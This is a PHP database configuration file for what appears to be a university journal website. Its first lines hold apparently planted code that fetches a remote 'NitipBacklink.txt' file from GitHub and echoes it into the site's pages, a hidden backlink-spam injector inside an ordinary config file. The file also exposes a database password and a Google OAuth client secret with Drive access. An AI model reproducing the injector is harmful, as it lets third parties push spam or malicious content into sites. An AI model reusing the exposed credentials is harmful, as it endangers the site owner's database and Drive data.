<?php
$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
error_reporting(E_ALL ^ E_DEPRECATED);
$host = "localhost";
$user = "u1461017_pendas";
$pass = "wasmicarman";
$dbName = "u1461017_pendas";
$masuk = mysql_connect($host,$user,$pass);
$hore = mysql_select_db($dbName);
$koneksi = mysqli_connect($host,$user,$pass,$dbName);
$conn = mysqli_connect($host,$user,$pass,$dbName);
$db = new mysqli($host, $user, $pass, $dbName);
$db1 = new mysqli($host, $user, $pass, $dbName);
mysql_connect($host, $user, $pass);
mysql_select_db($dbName)
or die ("Connect Failed !! : ".mysql_error());
$kode="location:../index.php?pesan=ilegal";
$url ="https://pendas.uptjurnal.unpas.ac.id";

//GOOGLE_CLIENT_ID
$a='296205839009-5143jiv7u4o0i21opa5dnnautkigha3p.apps.googleusercontent.com';

//GOOGLE_CLIENT_SECRET
$b='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';

//GOOGLE_OAUTH_SCOPE
$c='https://www.googleapis.com/auth/drive';
//REDIRECT_URI

$d='https://pendas.uptjurnal.unpas.ac.id/upload_drive_all/google_drive_sync.php';
?>
